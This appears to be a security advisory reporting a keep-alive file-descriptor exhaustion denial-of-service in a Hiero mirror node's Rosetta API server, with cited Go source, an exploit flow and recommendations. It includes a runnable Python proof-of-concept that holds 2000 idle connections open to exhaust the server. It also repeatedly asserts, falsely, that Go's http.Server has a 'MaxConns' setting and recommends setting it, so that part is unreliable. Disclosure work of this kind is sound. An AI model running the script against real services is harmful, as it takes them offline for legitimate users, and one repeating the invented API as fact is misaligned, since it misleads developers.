### Title
Unbounded `Http.IdleTimeout` Combined with No Connection Limit Enables Keep-Alive FD Exhaustion DoS

### Summary
The Rosetta API HTTP server accepts `Http.IdleTimeout` as an unclamped `time.Duration` with no upper-bound validation. When an operator sets this to a large value, any unprivileged external user can open thousands of TCP keep-alive connections, hold them idle for the full timeout duration, and exhaust the process's file descriptor limit — blocking all new legitimate connections. No connection-count limit or rate-limiting is applied to the server.

### Finding Description
**Code locations:**

- `rosetta/app/config/types.go:64-69` — `Http.IdleTimeout` is a plain `time.Duration` field with no validation, no minimum, and no maximum.
- `rosetta/main.go:220-227` — The value is assigned directly to `http.Server.IdleTimeout` with no clamping. Critically, `http.Server.MaxConns` is never set (defaults to 0 = unlimited).

```go
// rosetta/app/config/types.go:64-69
type Http struct {
    IdleTimeout       time.Duration `yaml:"idleTimeout"`
    ...
}

// rosetta/main.go:220-227
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,   // no clamp
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
    // MaxConns: not set → unlimited
}
```

**Root cause:** Two absent controls combine: (1) no upper-bound enforcement on `IdleTimeout` in config loading (`config.go` `LoadConfig()` performs no range checks), and (2) no `MaxConns` or connection-rate limit on the `http.Server`. Go's `net/http` keeps one file descriptor open per idle keep-alive connection for the full `IdleTimeout` duration.

**Exploit flow:**
1. Operator sets `hiero.mirror.rosetta.http.idleTimeout` to a large value (e.g., `3600000000000` = 1 hour). The code accepts any value without complaint.
2. Attacker opens N TCP connections to port 5700 and sends a minimal valid HTTP/1.1 request on each (e.g., `GET /health HTTP/1.1\r\nConnection: keep-alive\r\n\r\n`).
3. After the response, the attacker's client sends no further data. The server keeps each connection open for up to 1 hour waiting for the next request.
4. Each open connection consumes one file descriptor. Linux default per-process FD limit is typically 1024 (soft) or 65536 (hard). With no `MaxConns`, the server accepts connections until FDs are exhausted.
5. Once FDs are exhausted, `accept()` fails; all new legitimate connections are refused.

**Why existing checks fail:** There is no middleware performing connection counting, no `http.Server.MaxConns`, no TCP-level backlog limit enforced in application code, and no rate-limiting layer visible in `main.go`'s middleware chain (`MetricsMiddleware` → `TracingMiddleware` → `CorsMiddleware`).

### Impact Explanation
A successful attack renders the Rosetta API completely unavailable to legitimate users (exchanges, block explorers, Coinbase Rosetta clients) for the duration of the attack. Because the Rosetta API is used for construction and submission of transactions, prolonged unavailability constitutes a griefing-level denial of service with no economic damage to the attacker. Severity matches the stated scope: Medium.

### Likelihood Explanation
The attack requires only network access to port 5700 — no credentials, no authentication, no special protocol knowledge. Standard tools (`hping3`, `wrk`, or a trivial Python script) can open thousands of keep-alive connections. The only precondition is that an operator has set `idleTimeout` to a large value; since there is no upper-bound guard and the documentation lists the default as `10000000000` ns (10 s, reasonable), a misconfiguration to hours is plausible in production tuning. The attack is trivially repeatable.

### Recommendation
1. **Enforce an upper bound in `LoadConfig`** — after unmarshalling, validate `rosettaConfig.Http.IdleTimeout` and cap it (e.g., `<= 120s`); return an error or clamp silently.
2. **Set `http.Server.MaxConns`** in `rosetta/main.go` to a reasonable limit (e.g., 1000–5000) to bound the number of simultaneous connections regardless of timeout value.
3. **Add a connection-rate limiter** (e.g., `golang.org/x/net/netutil.LimitListener`) wrapping the TCP listener before passing it to `ListenAndServe`.

### Proof of Concept
```bash
# Precondition: server configured with idleTimeout = 3600000000000 (1 hour)
# Step 1: open 2000 keep-alive connections, each sending one valid request
python3 - <<'EOF'
import socket, time, threading

def hold(i):
    s = socket.socket()
    s.connect(("127.0.0.1", 5700))
    s.sendall(b"GET /health HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n")
    time.sleep(3600)  # hold open for 1 hour

threads = [threading.Thread(target=hold, args=(i,)) for i in range(2000)]
for t in threads: t.start()
for t in threads: t.join()
EOF

# Step 2: verify new connections are refused
curl http://127.0.0.1:5700/health
# Expected: connection refused / timeout — server FDs exhausted
``` [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** rosetta/app/config/types.go (L64-69)
```go
type Http struct {
	IdleTimeout       time.Duration `yaml:"idleTimeout"`
	ReadTimeout       time.Duration `yaml:"readTimeout"`
	ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
	WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** rosetta/app/config/config.go (L44-98)
```go
func LoadConfig() (*Mirror, error) {
	nodeMap, err := loadNodeMapFromEnv()
	if err != nil {
		return nil, err
	}

	// NodeMap's key has '.', set viper key delimiter to avoid parsing it as a nested key
	v := viper.NewWithOptions(viper.KeyDelimiter(keyDelimiter))
	v.SetConfigType(configTypeYaml)

	// read the default
	if err := v.ReadConfig(bytes.NewBuffer([]byte(defaultConfig))); err != nil {
		return nil, err
	}

	// load configuration file from current directory
	v.SetConfigName(configName)
	v.AddConfigPath(".")
	if err := mergeExternalConfigFile(v); err != nil {
		return nil, err
	}

	if envConfigFile, ok := os.LookupEnv(apiConfigEnvKey); ok {
		v.SetConfigFile(envConfigFile)
		if err := mergeExternalConfigFile(v); err != nil {
			return nil, err
		}
	}

	// enable parsing env variables after the configuration files are loaded so viper knows all configuration keys
	// and can override the config accordingly
	v.AutomaticEnv()
	v.SetEnvKeyReplacer(strings.NewReplacer(keyDelimiter, envKeyDelimiter))

	var config fullConfig
	compositeDecodeHookFunc := mapstructure.ComposeDecodeHookFunc(
		mapstructure.StringToTimeDurationHookFunc(),
		nodeMapDecodeHookFunc,
	)
	if err := v.Unmarshal(&config, viper.DecodeHook(compositeDecodeHookFunc)); err != nil {
		return nil, err
	}

	mirrorConfig := &config.Hiero.Mirror
	mirrorConfig.Rosetta.Network = strings.ToLower(mirrorConfig.Rosetta.Network)
	if len(nodeMap) != 0 {
		mirrorConfig.Rosetta.Nodes = nodeMap
	}

	var password = mirrorConfig.Rosetta.Db.Password
	mirrorConfig.Rosetta.Db.Password = "***" // Don't print password
	log.Infof("Using configuration: %+v", &config)
	mirrorConfig.Rosetta.Db.Password = password

	return mirrorConfig, nil
```
